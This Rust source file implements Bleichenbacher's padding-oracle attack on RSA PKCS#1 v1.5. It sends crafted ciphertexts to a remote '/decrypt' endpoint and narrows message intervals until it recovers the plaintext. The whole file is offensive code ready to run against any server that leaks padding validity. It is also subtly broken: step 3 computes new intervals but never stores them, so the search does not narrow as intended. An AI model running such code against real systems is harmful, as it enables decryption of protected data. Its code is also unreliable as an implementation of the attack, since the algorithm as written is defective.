#![allow(non_snake_case)]
#![allow(dead_code)]

use indicatif::{MultiProgress, ProgressBar, ProgressStyle};
use num_bigint::BigUint;
use num_traits::{One, Zero};
use rayon::iter::{IntoParallelRefIterator, ParallelIterator};
use reqwest::blocking::Client;
use serde_json::Value;
use std::{
    sync::{atomic::AtomicU64, Arc},
    time::Duration,
};

use crate::utils::{CustomError, DecryptRes, PublicKeyInfo};

const BATCH_SIZE: usize = 256;

#[derive(Debug)]
pub struct Oracle {
    pub client: Client,
    pub url: String,
}

impl Oracle {
    pub fn new(url: &str) -> Self {
        let client = Client::new();
        Self {
            client,
            url: String::from(url),
        }
    }

    pub fn is_pkcs1_compliant(&self, cipher: &BigUint, k: usize) -> Result<bool, CustomError> {
        let cipher_bytes = to_k_bytes_be(cipher, k);
        let res: DecryptRes = self
            .client
            .get(format!(
                "{}/decrypt?c={}",
                self.url,
                hex::encode(&cipher_bytes)
            ))
            .send()?
            .json()?;
        Ok(res.is_valid())
    }
}

#[derive(Debug)]
pub struct Attacker {
    pub oracle: Oracle,
    pub state: AttackState,
}

impl Attacker {
    pub fn new(url: &str, cipher: &[u8]) -> Result<Self, CustomError> {
        let client = Client::new();
        let json = client.get(url.to_string()).send()?.text()?;
        let v: Value = serde_json::from_str(&json)?;
        let public_json = &v["public"];

        let rsa_pubkey: PublicKeyInfo = serde_json::from_value(public_json.clone())?;

        let state = AttackState::new(rsa_pubkey, cipher);
        let oracle = Oracle::new(url);

        Ok(Self { oracle, state })
    }

    #[allow(clippy::too_many_arguments)]
    fn find_s_parallel(
        &self,
        c: &BigUint,
        e: &BigUint,
        n: &BigUint,
        k: usize,
        oracle: &Oracle,
        mut s_start: BigUint,
        s_upper: Option<&BigUint>,
        mp: Arc<MultiProgress>,
    ) -> Result<BigUint, CustomError> {
        let num_workers = rayon::current_num_threads();

        let mut bars_vec = Vec::with_capacity(num_workers);

        const UPDATE: u64 = 20;

        for i in 0..num_workers {
            let pb = mp.add(ProgressBar::new_spinner());
            let style =
                ProgressStyle::with_template("{spinner:.green} {prefix}: {msg}").unwrap();
            pb.set_style(style);
            pb.set_prefix(format!("{}", i));
            pb.enable_steady_tick(Duration::from_millis(100));
            bars_vec.push(pb);
        }

        let bars = Arc::new(bars_vec);

        let probe_counters: Vec<AtomicU64> = (0..num_workers).map(|_| AtomicU64::new(0)).collect();
        let probe_counters = Arc::new(probe_counters);

        let oracle = Arc::new(oracle);

        let probe = |cprime: BigUint| -> bool {
            oracle.is_pkcs1_compliant(&cprime, k).unwrap_or_else(|e| {
                eprintln!("Oracle error: {:?}", e);
                false
            })
        };

        while s_upper.is_none() || &s_start <= s_upper.unwrap() {
            let candidates: Vec<BigUint> = (0..BATCH_SIZE)
                .map(|i| &s_start + BigUint::from(i as u32))
                .filter(|s_candidate| {
                    if let Some(s_upper) = s_upper {
                        s_candidate <= s_upper
                    } else {
                        true
                    }
                })
                .collect();

            let successes: Vec<BigUint> = candidates
                .par_iter()
                .filter_map(|s_candidate| {
                    let se = s_candidate.modpow(e, n);
                    let cprime = (c * &se) % n;

                    let worker_id = rayon::current_thread_index().unwrap_or(0);
                    let pb = &bars[worker_id];
                    let counter = &probe_counters[worker_id];

                    let prev = counter.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
                    if prev.is_multiple_of(UPDATE) {
                        pb.set_message(format!("s={} | probes={}", s_candidate, prev + 1));
                    }

                    if probe(cprime) {
                        Some(s_candidate.clone())
                    } else {
                        None
                    }
                })
                .collect();

            if !successes.is_empty() {
                let min_s = successes.into_iter().min().unwrap();

                for pb in bars.iter() {
                    pb.finish_and_clear();
                }

                return Ok(min_s);
            }

            s_start += BigUint::from(BATCH_SIZE as u32);
        }

        Err(CustomError::Other(
            "No valid s found in the given range".to_string(),
        ))
    }

    pub fn attack(&mut self) -> Result<BigUint, CustomError> {
        // step1 can be skipped since `c` is already a valid PKCS#1 v1.5 ciphertext, but check
        // anyway
        if !self
            .oracle
            .is_pkcs1_compliant(&self.state.c, self.state.k)?
        {
            return Err(CustomError::Other(
                "Initial ciphertext is not PKCS#1 v1.5 compliant".to_string(),
            ));
        }

        let mp = Arc::new(MultiProgress::new());
        let main_pb = mp.add(ProgressBar::new_spinner());
        main_pb.set_style(
            ProgressStyle::with_template("[{elapsed_precise}] {msg} {spinner}")
                .unwrap()
                .tick_chars("'°º¤ø,¸¸,ø¤º°'"),
        );
        main_pb.enable_steady_tick(Duration::from_millis(100));
        main_pb.set_message("Es geht um die Wurst".to_string());

        // easier access to state variables
        let n = self.state.n.clone();
        let e = self.state.e.clone();
        let B = self.state.B.clone();
        let k = self.state.k;

        let c = self.state.c.clone();

        let B2 = 2u8 * &B;
        let B3 = 3u8 * &B;

        let mut prev_s = BigUint::one();

        let mut m_found = false;
        while !m_found {
            let mut s_i = if self.state.it == 1 {
                ceiling_div(&n, &B3)
            } else {
                &prev_s + BigUint::one()
            };

            if self.state.it == 1 || self.state.M.len() >= 2 {
                // parallel step2a / 2b
                main_pb.set_message(if self.state.it == 1 {
                    "step 2a".to_string()
                } else {
                    "step 2b".to_string()
                });

                s_i = self.find_s_parallel(
                    &c,
                    &e,
                    &n,
                    k,
                    &self.oracle,
                    s_i.clone(),
                    None,
                    mp.clone(),
                )?;
            } else {
                // just one interval in M
                // step 2c
                main_pb.set_message("step 2c".to_string());

                let (a, b) = &self.state.M[0];

                let mut r_i = ceiling_div(&(2u8 * (b * &prev_s - &B2)), &n);
                let mut s_upper = ceiling_div(&(&B3 + &r_i * &n), a);

                s_i = ceiling_div(&(&B2 + &r_i * &n), b); 

                while match self.find_s_parallel(
                    &c,
                    &e,
                    &n,
                    k,
                    &self.oracle,
                    s_i.clone(),
                    Some(&s_upper),
                    mp.clone(),
                ) {
                    Ok(found_s) => {
                        s_i = found_s;
                        false
                    }
                    Err(_) => true,
                } {
                    main_pb.set_message(format!(
                        "step 2c | iter={} | s={} | r={}",
                        self.state.it, s_i, r_i,
                    ));

                    r_i += 1u8;
                    s_i = ceiling_div(&(&B2 + &r_i * &n), b);
                    s_upper = ceiling_div(&(&B3 + &r_i * &n), a);
                }
            }

            // step 3
            main_pb.set_message("step 3".to_string());

            let mut new_M = Vec::<Interval>::new();
            for (a, b) in &self.state.M {
                let mut r = ceiling_div(&(a * &s_i - &B3 + 1u8), &n);
                let r_upper = (b * &s_i - &B2) / &n;

                while r <= r_upper {
                    let lower_bound = std::cmp::max(a.clone(), ceiling_div(&(&B2 + &r * &n), &s_i));
                    let upper_bound = std::cmp::min(b.clone(), &(&B3 - 1u8 + &r * &n) / &s_i);

                    let interval = (lower_bound, upper_bound);

                    if B2 <= interval.0 && interval.0 <= interval.1 && interval.1 < B3 {
                        new_M.push(interval);
                    }

                    r += 1u8;
                }
            }

            // merge M intervals
            self.state.combine_intervals();

            // loop operations
            prev_s = s_i;
            self.state.it += 1;

            if self.state.M.len() == 1 && self.state.M[0].0 == self.state.M[0].1 {
                m_found = true;
            }
        }

        main_pb.finish_with_message(format!(
            "Es geht um die Wurst: iterations={}",
            self.state.it
        ));

        let (m, _) = &self.state.M[0]; // only one interval left

        Ok(m.clone())
    }
}

pub fn to_k_bytes_be(x: &num_bigint::BigUint, k: usize) -> Vec<u8> {
    let mut x_bytes = x.to_bytes_be();
    while x_bytes.len() < k {
        x_bytes.insert(0, 0u8);
    }
    x_bytes
}

pub fn ceiling_div(num: &BigUint, den: &BigUint) -> BigUint {
    let quot = num / den;
    let rem = num % den;
    if rem.is_zero() {
        quot
    } else {
        quot + 1u8
    }
}

type Interval = (BigUint, BigUint);

#[derive(Debug)]
pub struct AttackState {
    pub k: usize,
    pub n: BigUint,
    pub B: BigUint,
    pub c: BigUint,
    pub M: Vec<Interval>,
    pub e: BigUint,

    pub it: u64,
}

impl AttackState {
    pub fn new(rsa_pubkey: PublicKeyInfo, c: &[u8]) -> Self {
        let decoded = hex::decode(&rsa_pubkey.public_modulus_hex).expect("Invalid hex in modulus");
        let k = decoded.len();
        let n = BigUint::from_bytes_be(&decoded);
        let e = BigUint::from(rsa_pubkey.public_exponent_dec);

        // B = 2^(8*(k-2))
        let B = {
            let exp: u32 = (8 * (k - 2)) as u32;
            let base: BigUint = 2u8.into();
            base.pow(exp)
        };
        let c = BigUint::from_bytes_be(c);

        // Initial interval: [2B, 3B - 1]
        let M = vec![(2u8 * &B, 3u8 * &B - 1u8)];

        Self {
            k,
            n,
            B,
            c,
            M,
            e,
            it: 1u64,
        }
    }

    pub fn combine_intervals(&mut self) {
        self.M.sort();

        let mut combined = vec![];
        for interval_a in self.M.iter() {
            let mut found = false;

            for interval_b in combined.iter_mut() {
                if overlap(interval_a, interval_b) {
                    interval_b.0 = ((&(interval_b.0)).min(&interval_a.0)).clone();
                    interval_b.1 = ((&(interval_b.1)).max(&interval_a.1)).clone();
                    found = true;
                    break;
                }
            }

            if !found {
                combined.push(interval_a.clone());
            }
        }

        self.M = combined;
    }
}

pub fn overlap(x: &Interval, y: &Interval) -> bool {
    x.0 <= y.1 && y.0 <= x.1
}
